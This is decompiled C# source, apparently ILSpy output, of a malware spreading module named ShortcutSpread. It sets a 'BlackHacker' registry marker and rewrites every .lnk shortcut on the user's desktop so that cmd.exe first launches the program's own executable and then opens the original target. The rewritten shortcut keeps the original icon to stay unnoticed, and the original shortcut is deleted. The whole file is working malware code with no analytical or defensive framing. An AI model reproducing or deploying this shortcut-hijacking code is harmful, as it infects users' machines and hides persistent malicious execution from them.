using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace WindowsApplication35;

[StandardModule]
public sealed class ShortcutSpread
{
	public static object comp = (object)new Computer();

	public static void ShortcutInfection()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		string text = default(string);
		string[] files = default(string[]);
		string text2 = default(string);
		string[] array = default(string[]);
		int num5 = default(int);
		string path = default(string);
		string extension = default(string);
		string text3 = default(string);
		string fileName = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				object obj2;
				object[] array2;
				object[] array3;
				bool[] array4;
				object obj3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 845:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 5:
							goto IL_0028;
						case 6:
							goto IL_002b;
						case 4:
						case 7:
						case 8:
							goto IL_003e;
						case 9:
							goto IL_0052;
						case 10:
							goto IL_0062;
						case 11:
							goto IL_0071;
						case 12:
							goto IL_0087;
						case 13:
							goto IL_0093;
						case 14:
							goto IL_009f;
						case 15:
							goto IL_00ac;
						case 16:
							goto IL_00c2;
						case 17:
							goto IL_00cf;
						case 18:
							goto IL_00e9;
						case 19:
							goto IL_014b;
						case 20:
							goto IL_0184;
						case 21:
							goto IL_01ac;
						case 22:
							goto IL_01d4;
						case 23:
							goto IL_0245;
						case 24:
							goto IL_0283;
						case 25:
							goto IL_028e;
						case 26:
							goto IL_02aa;
						case 27:
							goto IL_02ad;
						case 28:
							goto IL_02b3;
						default:
							goto end_IL_0000;
						case 3:
						case 29:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_028e:
					num = 25;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_02aa;
					IL_0008:
					num = 2;
					if (Operators.CompareString(RegValueGet("BlackHacker"), "True", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_0028;
					IL_0028:
					num = 5;
					goto IL_002b;
					IL_002b:
					num = 6;
					RegValueSet("BlackHacker", "True");
					goto IL_003e;
					IL_003e:
					num = 8;
					text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
					goto IL_0052;
					IL_0052:
					num = 9;
					files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
					goto IL_0062;
					IL_0062:
					num = 10;
					text2 = Application.get_ExecutablePath().ToString();
					goto IL_0071;
					IL_0071:
					num = 11;
					array = files;
					num5 = 0;
					goto IL_02b7;
					IL_02b7:
					if (num5 < array.Length)
					{
						path = array[num5];
						goto IL_0087;
					}
					goto end_IL_0000_2;
					IL_02aa:
					obj = null;
					goto IL_02ad;
					IL_0087:
					num = 12;
					extension = Path.GetExtension(path);
					goto IL_0093;
					IL_0093:
					num = 13;
					Path.GetFileNameWithoutExtension(path);
					goto IL_009f;
					IL_009f:
					num = 14;
					text3 = Path.GetFullPath(path);
					goto IL_00ac;
					IL_00ac:
					num = 15;
					if (Operators.CompareString(extension, ".lnk", false) == 0)
					{
						goto IL_00c2;
					}
					goto IL_02ad;
					IL_00c2:
					num = 16;
					fileName = Path.GetFileName(text3);
					goto IL_00cf;
					IL_00cf:
					num = 17;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_00e9;
					IL_00e9:
					num = 18;
					obj2 = objectValue;
					array2 = new object[1] { text3 };
					array3 = array2;
					array4 = new bool[1] { true };
					obj3 = NewLateBinding.LateGet(obj2, (Type)null, "CreateShortcut", array3, (string[])null, (Type[])null, array4);
					if (array4[0])
					{
						text3 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					objectValue2 = RuntimeHelpers.GetObjectValue(obj3);
					goto IL_014b;
					IL_02b3:
					num = 28;
					goto IL_02b7;
					IL_02ad:
					num5 = checked(num5 + 1);
					goto IL_02b3;
					IL_014b:
					num = 19;
					obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { text + fileName }, (string[])null, (Type[])null, (bool[])null);
					goto IL_0184;
					IL_0184:
					num = 20;
					NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
					goto IL_01ac;
					IL_01ac:
					num = 21;
					NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
					goto IL_01d4;
					IL_01d4:
					num = 22;
					NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + text2 + "&explorer /root,\"" + NewLateBinding.LateGet(objectValue2, (Type)null, "TargetPath", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "\" & exit" }, (string[])null, (Type[])null, false, true);
					goto IL_0245;
					IL_0245:
					num = 23;
					NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { NewLateBinding.LateGet(objectValue2, (Type)null, "TargetPath", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null, false, true);
					goto IL_0283;
					IL_0283:
					num = 24;
					File.Delete(text3);
					goto IL_028e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0000_dispatch = 845;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string RegValueGet(string name)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(comp, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\ShortCutInfection" }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { name, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				name = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "error < Not Found >";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object RegValueSet(string name, string values)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(comp, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\ShortCutInfection" }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { name, values };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				name = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				values = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}
}
